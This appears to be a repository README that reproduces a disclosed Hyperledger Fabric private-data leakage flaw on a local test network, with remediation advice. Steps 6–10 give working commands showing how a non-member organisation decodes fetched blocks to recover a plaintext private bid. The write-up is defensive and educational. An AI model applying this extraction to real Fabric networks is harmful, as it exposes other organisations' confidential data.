# Hyperledger Fabric — PDC Payload Plaintext Leakage (Use Case 3)

A reproduction of a **Private Data Collection (PDC) leakage** vulnerability in Hyperledger
Fabric, in which an organisation that is **not** a member of a private data collection recovers
the private data in **plaintext** — not by brute-forcing a hash, and without any malicious peer.

This reproduces **Use Case 3** from S. Wang et al., *On Private Data Collection of Hyperledger
Fabric* (responsibly disclosed to the Hyperledger Fabric team).

> **Ethics & scope.** Everything here runs on the throwaway Fabric `test-network` on your own
> machine. It is intended for learning and defensive validation only. Do not run the extraction
> step against any network you are not authorised to test.

---

## The vulnerability in short

For a PDC, Fabric hashes the private **read/write set** before writing it to the channel ledger
that every peer holds. However, the value a chaincode function **returns** travels in the
proposal response's `Response.payload`, which is **not** hashed. If a client invokes such a
function as a **submitted (ordered) transaction** (e.g. to record an on-chain audit of who read
the data) instead of a query, the plaintext payload is packaged into a block and replicated to
**every peer on the channel — including non-members of the collection**. A non-member can then
read the private value straight out of its own copy of the ledger.

The contrast is the whole point: in the same block, the read/write set is hashed
(`extension.results`), while the chaincode's return value (`extension.response.payload`) is
cleartext.

---

## Repository contents

```
.
├── leak-cc/                  # the vulnerable Go chaincode
│   ├── leak.go
│   ├── go.mod
│   └── go.sum
├── collections_config.json   # the private data collection definition
├── install-fabric.sh         # Hyperledger's installer for samples, binaries, images
└── README.md
```

The chaincode `leak-cc` writes the private bid via the **transient** field (so the write itself
carries no plaintext — this isolates the demonstration to the payload leak) and exposes
`ReadBidLeaky`, whose return value leaks the private bid into the response payload.

---

## Prerequisites

| Tool | Version (known-good) |
|------|----------------------|
| Docker + Docker Compose | **Engine 28.x** (see Troubleshooting — Engine **29** is broken) |
| Go | 1.20+ |
| `jq`, `base64`, `curl` | any recent |
| Hyperledger Fabric samples + binaries | 2.5.9 (installed below) |

---

## Setup

### 1. Clone this repository

```bash
git clone git@github.com:AritraS05/hyperledger-fabric.git
cd hyperledger-fabric
```

### 2. Install Fabric samples, binaries and Docker images (v2.5.9)

```bash
chmod +x install-fabric.sh
./install-fabric.sh --fabric-version 2.5.9 docker samples binary
export PATH=$PWD/fabric-samples/bin:$PATH
export FABRIC_CFG_PATH=$PWD/fabric-samples/config
```

### 3. Place the chaincode and collection config into the test-network

```bash
cp -R leak-cc fabric-samples/test-network/leak-cc
cp collections_config.json fabric-samples/test-network/collections_config.json
cd fabric-samples/test-network
```

### 4. Bring up a two-org network with a channel

```bash
./network.sh down
./network.sh up createChannel -c mychannel -ca
```

- **Org1** → PDC **member**
- **Org2** → channel member but **non-member** of the collection (the unauthorised observer)

### 5. Deploy the chaincode with the collection

```bash
./network.sh deployCC -ccn leak -ccp ./leak-cc -ccl go \
  -ccep "OR('Org1MSP.peer','Org2MSP.peer')" -cccg ./collections_config.json
```

You should see `Chaincode definition committed on channel 'mychannel'`.

---

## Reproduce the leak

### 6. As Org1 (member) — set identity and write the private bid

```bash
export FABRIC_CFG_PATH=$PWD/../config
export CORE_PEER_TLS_ENABLED=true
export CORE_PEER_LOCALMSPID=Org1MSP
export CORE_PEER_TLS_ROOTCERT_FILE=$PWD/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt
export CORE_PEER_MSPCONFIGPATH=$PWD/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp
export CORE_PEER_ADDRESS=localhost:7051
ORDERER_CA=$PWD/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem

BID_B64=$(echo -n '{"asset":"widget","price":50}' | base64 | tr -d '\n')

peer chaincode invoke -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com \
  --tls --cafile "$ORDERER_CA" -C mychannel -n leak \
  --peerAddresses localhost:7051 --tlsRootCertFiles "$CORE_PEER_TLS_ROOTCERT_FILE" \
  --transient "{\"bid\":\"$BID_B64\"}" \
  -c '{"function":"SubmitBid","Args":["bid1"]}'
```

### 7. As Org1 — read the bid as a submitted transaction (the mistake)

```bash
peer chaincode invoke -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com \
  --tls --cafile "$ORDERER_CA" -C mychannel -n leak \
  --peerAddresses localhost:7051 --tlsRootCertFiles "$CORE_PEER_TLS_ROOTCERT_FILE" \
  -c '{"function":"ReadBidLeaky","Args":["bid1"]}'
```

The response already shows the plaintext in the payload:
`result: status:200 payload:"{\"asset\":\"widget\",\"price\":50}"`. That plaintext is now
ordered into a block and replicated to every peer.

### 8. Switch to Org2 (non-member) — direct read is denied

```bash
export CORE_PEER_LOCALMSPID=Org2MSP
export CORE_PEER_TLS_ROOTCERT_FILE=$PWD/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt
export CORE_PEER_MSPCONFIGPATH=$PWD/organizations/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp
export CORE_PEER_ADDRESS=localhost:9051

peer chaincode query -C mychannel -n leak -c '{"function":"ReadBidLeaky","Args":["bid1"]}'
# => Error: ... tx creator does not have read access permission ... collectionName: pricesCollection
```

Access control is working — Org2 **cannot** read the collection directly.

### 9. As Org2 — recover the plaintext from the block anyway

```bash
peer channel getinfo -c mychannel
peer channel fetch newest org2_newest.block -c mychannel \
  -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com --tls --cafile "$ORDERER_CA"

configtxlator proto_decode --type common.Block --input org2_newest.block --output org2_newest.json

jq -r '.data.data[].payload.data.actions[].payload.action
        .proposal_response_payload.extension.response.payload' org2_newest.json | base64 -d; echo
# => {"asset":"widget","price":50}
```

> If `newest` fetches the wrong block, fetch a specific number instead:
> `peer channel fetch <N> org2_<N>.block -c mychannel ...` (try `HEIGHT-1`, `HEIGHT-2`, …) and
> re-run the `jq` line until the bid prints.

### 10. Contrast — the same block's read/write set is hashed

```bash
jq '.data.data[].payload.data.actions[].payload.action
     .proposal_response_payload.extension.results' org2_newest.json
```

You will see `collection_hashed_rwset` with a `hashed_rwset` value — the rwset is hashed, while
the payload in step 9 was plaintext. That gap is the vulnerability.

---

## Expected result

A channel member that is **not** a member of the private data collection recovers the exact
private bid (`{"asset":"widget","price":50}`) directly from the shared ledger, despite being
explicitly denied a direct collection read — with no brute-forcing, no collusion, and no
malicious peer.

---

## The fix

The root cause: a chaincode **returns private data**, and a client **submits** that call as a
transaction, so the plaintext return value is ordered into a block replicated to every peer.

- **Read private data with a query, not a submitted transaction** (`evaluateTransaction` /
  `peer chaincode query`). A query runs on a member endorser and is never ordered into a block,
  so non-members never see it. This is the fix for the vast majority of cases.
- **If an on-chain audit record is required**, store only non-sensitive metadata (reader
  identity, key, timestamp), never the private value.
- **Never return the stored value from write functions** — return a receipt or status only.
- **If a value must be returned on-chain**, return ciphertext (AES-GCM, key shared among
  members via the transient field).
- Access control and minimising channel membership reduce exposure but are **not** a root fix —
  every channel member still receives every block.

---

## Troubleshooting

### `docker.proxy.sock: write: broken pipe` during `deployCC`

This is a known incompatibility between **Docker Engine v29** (released Nov 2025) and Fabric's
chaincode-install build path (Hyperledger Fabric issue #5350). Check your engine:

```bash
docker version --format 'Server engine: {{.Server.Version}}'
```

If it reports **29.x**, downgrade Docker Desktop to a build bundling **Engine 28.x** (e.g.
Docker Desktop 4.48.0 / Engine 28.5.1, or earlier), then re-run the network bring-up and
`deployCC`. Turn off Docker Desktop auto-update so it does not jump back to v29.

### zsh pasting errors (`command not found: #`)

macOS zsh does not treat `#` as a comment on the interactive command line. Paste commands
without their `# comment` lines, or run `setopt interactive_comments` once in the shell.

---

## Reference

- S. Wang, M. Yang, Y. Zhang, Y. Luo, T. Ge, X. Fu, W. Zhao, *On Private Data Collection of
  Hyperledger Fabric* — Use Case 3 (the "Payload" field used to return information) and the
  PDC Leakage attack.
- Hyperledger Fabric docs — *Private Data*: only a hash of the read/write set is written to the
  shared ledger; the private data itself is gossiped peer-to-peer among members.

---

*Reproduced on an isolated throwaway test-network for educational and defensive purposes only.*
